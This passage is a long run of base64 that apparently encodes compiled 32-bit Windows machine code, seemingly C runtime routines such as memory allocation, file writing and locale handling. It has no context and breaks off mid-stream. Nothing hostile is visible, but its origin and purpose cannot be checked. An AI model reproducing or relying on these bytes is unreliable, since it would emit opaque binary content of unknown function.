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rf//xwAWAAAA6Fid//+Lx+gVrv//w/ZGDEB0BoNmDADr7FboGZ7//1mDZfwAVug/////WYv4iX3kx0X8/v///+gIAAAA68eLdQiLfeRW6F2e//9Zw2oUaFhIARDohK3//zP2iXXki30Ig//+dRDoFq3//8cACQAAAOm3AAAAhf8PiJ8AAAA7PQS4ARAPg5MAAACLx8H4BYlF4Ivfg+MfweMGiwSFGK0BEA++RAMEg+ABdHJX6F0ZAABZiXX8i0XgiwSFGK0BEPZEAwQBdChX6FYaAABZUP8V6PAAEIXAdQj/FUDwABCL8Il15IX2dBjoYaz//4kw6I6s///HAAkAAACDzv+JdeTHRfz+////6AoAAACLxushi30Ii3XkV+huGgAAWcPoX6z//8cACQAAAOgxnP//g8j/6O2s///DahBoeEgBEOibrP//M9uJXeSLdQiD/v51F+j5q///iRjoJqz//8cACQAAAOm2AAAAhfYPiJcAAAA7NQS4ARAPg4sAAACL3sH7BYv+g+cfwecGiwSdGK0BEA++RDgEg+ABdQrosKv//4MgAOtqVuhmGAAAWYNl/ACLBJ0YrQEQ9kQ4BAF0E/91EP91DFboXgAAAIPEDIv46xborqv//8cACQAAAOhvq///gyAAg8//iX3kx0X8/v///+gKAAAAi8frKIt1CIt95FbohhkAAFnD6EOr//+JGOhwq///xwAJAAAA6EKb//+DyP/o/qv//8NVi+y48BoAAOg7GwAAoQCcARAzxYlF/IOlROX//wCLRQiLTQxWM/aJhTjl//9XM/+JjTDl//+JtUDl//85dRB1BzPA6Q0IAACFyXUf6Neq//8hMOgEq///xwAWAAAA6Naa//+DyP/p6gcAAIvQi8jB+gWD4R/B4QaJlSjl//9TixSVGK0BEImNJOX//4pcESQC29D7gPsCdAWA+wF1K4tFEPfQqAF1HOh8qv//ITDoqar//8cAFgAAAOh7mv//6YgHAACLhTjl///2RBEEIHQPagJqAGoAUOiqGQAAg8QQ/7U45f//6ObZ//9ZhcAPhFADAACLhSjl//+LjSTl//+LBIUYrQEQ9kQBBIAPhDIDAADoOa///zPJi0BsOYioAAAAjYUY5f//UIuFKOX//w+UwYmNPOX//4uNJOX//4sEhRitARD/NAH/FfDwABCFwA+E7gIAADm1POX//3QIhNsPhN4CAAD/FezwABCLlTDl//8zySGNOOX//4mFEOX//4mNNOX//4mVLOX//zlNEA+GgQYAAIuFLOX//zPSiZVA5f//x4UU5f//CgAAACG9POX//4TbD4WuAQAAihAzwIuNJOX//4D6Cg+UwImFGOX//4uFKOX//4sEhRitARCJhTzl//85fAE4dByKRAE0iEX0i4U85f//iFX1agIhfAE4jUX0UOtaD77CUOia4///WYXAdESLhTDl//+LlSzl//8rwgNFEIP4AQ+G2wEAAGoCUo2FNOX//1DoDeb//4PEDIP4/w+EBQMAAIuFLOX//0D/hUDl///rJmoB/7Us5f//jYU05f//UOje5f//g8QMg/j/D4TWAgAAi4Us5f//M8lA/4VA5f//UVFqBYmFLOX//41F9FBqAY2FNOX//1BR/7UQ5f///xVo8AAQiYU85f//hcAPhJUCAABqAI2NOOX//1GLjSTl//9QjUX0UIuFKOX//4sEhRitARD/NAH/FcTwABCFwA+ETAEAAIu1QOX//4uNROX//wPxi4U85f//OYU45f//D4xJAgAAOb0Y5f//dEuLjSTl//+NhTjl//9qAFBqAY1F9MZF9A1Qi4Uo5f//iwSFGK0BEP80Af8VxPAAEIXAD4TtAAAAg7045f//AQ+M9wEAAP+FROX//0aLjTTl///phgAAAID7AXQFgPsCdTMPtwgz0mY7jRTl//+JjTTl//8PlMKDwAKJlTzl//+LlUDl//+DwgKJhSzl//+JlUDl//+A+wF0BYD7AnVLUehEFwAAWYuNNOX//2Y7wXV1g8YCOb085f//dCJqDVhQiYU05f//6B4XAABZi4005f//ZjvBdU9G/4VE5f//i5VA5f//i4Us5f//O1UQD4Kp/f//6UUBAACLnSjl//9GigKLlSTl//+LDJ0YrQEQiEQKNIsEnRitARDHRAI4AQAAAOkXAQAA/xVA8AAQi/jpCgEAAIuFKOX//4sMhRitARCLhSTl///2RAgEgA+EdQMAAIuVMOX//zP/ib005f//hNsPhQ4BAACLXRCJlTjl//+F2w+EjQMAADPJjb306///i8KJjTzl//8rhTDl//87w3NEigpCQIiNH+X//4D5ComVOOX//4uNPOX//3UL/4VE5f//xgcNR0GKlR/l//+IF0eLlTjl//9BiY085f//gfn/EwAAcriLjSTl//+NhfTr//8r+I2FIOX//2oAUFeNhfTr//9Qi4Uo5f//iwSFGK0BEP80Af8VxPAAEIXAD4QT////A7Ug5f//Ob0g5f//fBaLlTjl//+LwiuFMOX//zvDD4JB////i7005f//i41E5f//hfYPhfUCAACF/w+ErAIAAGoFWzv7D4WYAgAA6Oml///HAAkAAADoqqX//4kY6cYCAACLyoD7Ag+F6gAAADl1EA+GfAIAAMeFFOX//woAAACDpRjl//8AjZ306///i8FqDSvCi5UY5f//XjtFEHMzD7c5g8ACg8ECZju9FOX//3UQg4VE5f//AmaJM4PDAoPCAmaJO4PCAoPDAoH6/hMAAHLIjYX06///iY085f//i40k5f//K9hqAI2FIOX//1BTjYX06///UIuFKOX//4sEhRitARD/NAH/FcTwABCLtUDl//+LvTTl//+FwA+E8v3//wO1IOX//4m1QOX//zmdIOX//w+M8f7//4uNPOX//4vBi5Uw5f//K8I7RRAPgi7////p0/7//4tdEImNOOX//4XbD4SKAQAAx4UU5f//CgAAAIOlGOX//wCNhUjl//+LvTjl//8ryouVGOX//zvLczsPtzeDwQKDxwKJvTjl//9mO7UU5f//dRJqDV9miTiDwAKLvTjl//+DwgJmiTCDwgKDwAKB+qgGAABywTP2jY2c8v//VlZoVQ0AAFGNjUjl//8rwZkrwtH4UIvBUFZo6f0AAP8VaPAAEIu1QOX//4u9NOX//4mFPOX//4XAD4QA/f//M8mJjUDl//9qACvBjZUg5f//UlCNhZzy//8DwYuNJOX//1CLhSjl//+LBIUYrQEQ/zQB/xXE8AAQhcB0HouNQOX//wONIOX//4uFPOX//4mNQOX//zvBf6/rGv8VQPAAEIuNQOX//4v4i4U85f//ib005f//O8EPj5r9//+LjTjl//+L8YuVMOX//yvyibVA5f//O/MPgsT+///pd/3//2oAjZUg5f//Uv91EP+1MOX///80CP8VxPAAEIXAD4Q9/P//i7Ug5f//M//pR/3//1foL6P//1nrPIuVMOX//4uFKOX//4uNJOX//4sEhRitARD2RAEEQHQJgDoadQQzwOsc6B+j///HABwAAADo4KL//4MgAIPI/+sEK/GLxluLTfxfM81e6OqF//+L5V3DVYvsVot1CIX2D4TqAAAAi0YMOwU0pQEQdAdQ6KaP//9Zi0YQOwU4pQEQdAdQ6JSP//9Zi0YUOwU8pQEQdAdQ6IKP//9Zi0YYOwVApQEQdAdQ6HCP//9Zi0YcOwVEpQEQdAdQ6F6P//9Zi0YgOwVIpQEQdAdQ6EyP//9Zi0YkOwVMpQEQdAdQ6DqP//9Zi0Y4OwVgpQEQdAdQ6CiP//9Zi0Y8OwVkpQEQdAdQ6BaP//9Zi0ZAOwVopQEQdAdQ6ASP//9Zi0ZEOwVspQEQdAdQ6PKO//9Zi0ZIOwVwpQEQdAdQ6OCO//9Zi0ZMOwV0pQEQdAdQ6M6O//9ZXl3DVYvsVot1CIX2dFmLBjsFKKUBEHQHUOivjv//WYtGBDsFLKUBEHQHUOidjv//WYtGCDsFMKUBEHQHUOiLjv//WYtGMDsFWKUBEHQHUOh5jv//WYtGNDsFXKUBEHQHUOhnjv//WV5dw1WL7FaLdQiF9g+EbgMAAP92BOhMjv///3YI6ESO////dgzoPI7///92EOg0jv///3YU6CyO////dhjoJI7///826B2O////diDoFY7///92JOgNjv///3Yo6AWO////dizo/Y3///92MOj1jf///3Y06O2N////dhzo5Y3///92OOjdjf///3Y86NWN//+DxED/dkDoyo3///92ROjCjf///3ZI6LqN////dkzoso3///92UOiqjf///3ZU6KKN////dljomo3///92XOiSjf///3Zg6IqN////dmTogo3///92aOh6jf///3Zs6HKN////dnDoao3///92dOhijf///3Z46FqN////dnzoUo3//4PEQP+2gAAAAOhEjf///7aEAAAA6DmN////togAAADoLo3///+2jAAAAOgjjf///7aQAAAA6BiN////tpQAAADoDY3///+2mAAAAOgCjf///7acAAAA6PeM////tqAAAADo7Iz///+2pAAAAOjhjP///7aoAAAA6NaM////trgAAADoy4z///+2vAAAAOjAjP///7bAAAAA6LWM////tsQAAADoqoz///+2yAAAAOifjP//g8RA/7bMAAAA6JGM////trQAAADohoz///+21AAAAOh7jP///7bYAAAA6HCM////ttwAAADoZYz///+24AAAAOhajP///7bkAAAA6E+M////tugAAADoRIz///+20AAAAOg5jP///7bsAAAA6C6M////tvAAAADoI4z///+29AAAAOgYjP///7b4AAAA6A2M////tvwAAADoAoz///+2AAEAAOj3i////7YEAQAA6OyL//+DxED/tggBAADo3ov///+2DAEAAOjTi////7YQAQAA6MiL////thQBAADovYv///+2GAEAAOiyi////7YcAQAA6KeL////tiABAADonIv///+2JAEAAOiRi////7YoAQAA6IaL////tiwBAADoe4v///+2MAEAAOhwi////7Y0AQAA6GWL////tjgBAADoWov///+2PAEAAOhPi////7ZAAQAA6ESL////tkQBAADoOYv//4PEQP+2SAEAAOgri////7ZMAQAA6CCL////tlABAADoFYv///+2VAEAAOgKi////7ZYAQAA6P+K////tlwBAADo9Ir///+2YAEAAOjpiv//g8QcXl3DVYvsUVGhAJwBEDPFiUX8U1aLdRhXhfZ+IYtFFIvOSYA4AHQIQIXJdfWDyf+LxivBSDvGjXABfAKL8ItNJDP/hcl1DYtFCIsAi0AEi8iJRSQzwDlFKGoAagBW/3UUD5XAjQTFAQAAAFBR/xVk8AAQi8iJTfiFyXUHM8DpcQEAAH5XauAz0lj38YP4AnJLA8mNQQg7wXY/i0X4jQRFCAAAAD0ABAAAdxPo1A0AAIvchdt0HscDzMwAAOsTUOiDh///i9hZhdt0CccD3d0AAIPDCItN+OsFi034M9uF23SaUVNW/3UUagH/dST/FWTwABCFwA+E8AAAAIt1+GoAagBWU/91EP91DOg3BwAAi/iDxBiF/w+EzwAAAPdFEAAEAAB0LItNIIXJD4S7AAAAO/kPj7MAAABR/3UcVlP/dRD/dQzo/QYAAIPEGOmaAAAAhf9+T2rgM9JY9/eD+AJyQ40MP41BCDvBdjmNBH0IAAAAPQAEAAB3E+gGDQAAi/SF9nRnxwbMzAAA6xNQ6LWG//+L8FmF9nRSxwbd3QAAg8YI6wIz9oX2dEGLRfhXVlBT/3UQ/3UM6IoGAACDxBiFwHQhM8BQUDlFIHUEUFDrBv91IP91HFdWUP91JP8VaPAAEIv4VuhkAAAAWVPoXQAAAFmLx41l7F9eW4tN/DPN6AN///+L5V3DVYvsg+wQ/3UIjU3w6GSO////dSiNRfD/dST/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